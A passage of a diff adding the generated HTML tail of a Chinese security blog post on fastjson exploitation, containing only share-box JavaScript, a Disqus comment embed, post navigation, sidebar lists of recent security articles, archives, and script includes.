+                box = $('#' + id);
+
+                if (box.hasClass('on')){
+                    box.removeClass('on');
+                    return;
+                }
+            } else {
+                var html = [
+                    '<div id="' + id + '" class="article-share-box">',
+                        '<input class="article-share-input" value="' + url + '">',
+                        '<div class="article-share-links">',
+                            '<a href="https://twitter.com/intent/tweet?url=' + encodedUrl + '" class="fa fa-twitter article-share-twitter" target="_blank" title="Twitter"></a>',
+                            '<a href="https://www.facebook.com/sharer.php?u=' + encodedUrl + '" class="fa fa-facebook article-share-facebook" target="_blank" title="Facebook"></a>',
+                            '<a href="http://pinterest.com/pin/create/button/?url=' + encodedUrl + '" class="fa fa-pinterest article-share-pinterest" target="_blank" title="Pinterest"></a>',
+                            '<a href="https://plus.google.com/share?url=' + encodedUrl + '" class="fa fa-google article-share-google" target="_blank" title="Google+"></a>',
+                        '</div>',
+                    '</div>'
+                ].join('');
+
+              box = $(html);
+
+              $('body').append(box);
+            }
+
+            $('.article-share-box.on').hide();
+
+            box.css({
+                top: offset.top + 25,
+                left: offset.left
+            }).addClass('on');
+
+        }).on('click', '.article-share-box', function (e) {
+            e.stopPropagation();
+        }).on('click', '.article-share-box-input', function () {
+            $(this).select();
+        }).on('click', '.article-share-box-link', function (e) {
+            e.preventDefault();
+            e.stopPropagation();
+
+            window.open(this.href, 'article-share-box-window-' + Date.now(), 'width=500,height=450');
+        });
+    })(jQuery);
+</script>
+
+            
+    
+        <a href="http://5alt.me/2017/09/fastjson调试利用记录/#comments" class="article-comment-link disqus-comment-count" data-disqus-url="http://5alt.me/2017/09/fastjson调试利用记录/">评论</a>
+    
+
+        </footer>
+    </div>
+    
+        
+<nav id="article-nav">
+    
+        <a href="/2017/09/jQuery里的html()/" id="article-nav-newer" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">上一篇</strong>
+            <div class="article-nav-title">
+                
+                    jQuery里的html()
+                
+            </div>
+        </a>
+    
+    
+        <a href="/2017/09/记一次apk检测/" id="article-nav-older" class="article-nav-link-wrap">
+            <strong class="article-nav-caption">下一篇</strong>
+            <div class="article-nav-title">记一次apk检测</div>
+        </a>
+    
+</nav>
+
+
+    
+</article>
+
+
+    
+    <section id="comments">
+    
+        
+    <div id="disqus_thread">
+        <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    </div>
+
+
+    
+    </section>
+
+</section>
+            
+                <aside id="sidebar">
+   
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">最新文章</h3>
+        <div class="widget">
+            <ul id="recent-post" class="">
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2019/02/xss-in-azure-devops/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/web/">web</a></p>
+                            <p class="item-title"><a href="/2019/02/xss-in-azure-devops/" class="title">How I alert(1) in Azure DevOps</a></p>
+                            <p class="item-date"><time datetime="2019-02-25T16:00:00.000Z" itemprop="datePublished">2019-02-26</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/08/某开发工具沙箱绕过导致RCE/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/奇技淫巧/">奇技淫巧</a></p>
+                            <p class="item-title"><a href="/2018/08/某开发工具沙箱绕过导致RCE/" class="title">某开发工具沙箱绕过导致RCE</a></p>
+                            <p class="item-date"><time datetime="2018-07-31T16:00:00.000Z" itemprop="datePublished">2018-08-01</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/04/批量扫描智能合约中的整数溢出问题/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/以太坊/">以太坊</a></p>
+                            <p class="item-title"><a href="/2018/04/批量扫描智能合约中的整数溢出问题/" class="title">批量扫描智能合约中的整数溢出问题</a></p>
+                            <p class="item-date"><time datetime="2018-04-25T16:00:00.000Z" itemprop="datePublished">2018-04-26</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/04/weblogic反序列化漏洞分析与调试/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/web/">web</a></p>
+                            <p class="item-title"><a href="/2018/04/weblogic反序列化漏洞分析与调试/" class="title">weblogic反序列化漏洞分析与调试</a></p>
+                            <p class="item-date"><time datetime="2018-04-19T16:00:00.000Z" itemprop="datePublished">2018-04-20</time></p>
+                        </div>
+                    </li>
+                
+                    <li>
+                        
+                        <div class="item-thumbnail">
+                            <a href="/2018/04/业务逻辑中的session问题/" class="thumbnail">
+    
+    
+        <span class="thumbnail-image thumbnail-none"></span>
+    
+</a>
+
+                        </div>
+                        
+                        <div class="item-inner">
+                            <p class="item-category"><a class="article-category-link" href="/categories/web/">web</a></p>
+                            <p class="item-title"><a href="/2018/04/业务逻辑中的session问题/" class="title">业务逻辑中的session问题</a></p>
+                            <p class="item-date"><time datetime="2018-04-16T16:00:00.000Z" itemprop="datePublished">2018-04-17</time></p>
+                        </div>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">分类</h3>
+        <div class="widget">
+            <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/fun/">fun</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/radio/">radio</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web/">web</a><span class="category-list-count">15</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/云安全/">云安全</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/以太坊/">以太坊</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/奇技淫巧/">奇技淫巧</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/杂/">杂</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/渗透测试/">渗透测试</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/逆向/">逆向</a><span class="category-list-count">2</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    <div class="widget-wrap">
+        <h3 class="widget-title">归档</h3>
+        <div class="widget">
+            <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/02/">二月 2019</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">八月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/04/">四月 2018</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/02/">二月 2018</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">一月 2018</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">十一月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/09/">九月 2017</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/08/">八月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/07/">七月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">六月 2017</a><span class="archive-list-count">2</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/02/">二月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/01/">一月 2017</a><span class="archive-list-count">1</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/12/">十二月 2016</a><span class="archive-list-count">3</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">十一月 2016</a><span class="archive-list-count">4</span></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">十月 2016</a><span class="archive-list-count">2</span></li></ul>
+        </div>
+    </div>
+
+    
+        
+    
+        
+    
+        
+    <div class="widget-wrap widget-list">
+        <h3 class="widget-title">链接</h3>
+        <div class="widget">
+            <ul>
+                
+                    <li>
+                        <a href="http://5alt.me">5alt</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://mohamoha.club">么哈么哈</a>
+                    </li>
+                
+                    <li>
+                        <a href="http://www.yulegeyu.com">雨了个雨</a>
+                    </li>
+                
+            </ul>
+        </div>
+    </div>
+
+
+    
+    <div id="toTop" class="fa fa-angle-up"></div>
+</aside>
+            
+        </div>
+        <footer id="footer">
+    <div class="outer">
+        <div id="footer-info" class="inner">
+            &copy; 2019 md5_salt<br>
+        </div>
+    </div>
+</footer>
+
+        
+    
+    <script>
+    var disqus_config = function () {
+        
+            this.page.url = 'http://5alt.me/2017/09/fastjson调试利用记录/';
+        
+        this.page.identifier = 'fastjson调试利用记录';
+    };
+    (function() { // DON'T EDIT BELOW THIS LINE
+        var d = document, s = d.createElement('script');
+        s.src = 'https://5alts-blog.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+        })();
+</script>
+
+
+
+
+    
+        <script src="/libs/lightgallery/js/lightgallery.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-thumbnail.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-pager.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-autoplay.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-fullscreen.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-zoom.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-hash.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-share.min.js"></script>
+        <script src="/libs/lightgallery/js/lg-video.min.js"></script>
+    
+    
+
+
+
+<!-- Custom Scripts -->
+<script src="/js/main.js"></script>
+
+    </div>
+</body>
+</html>
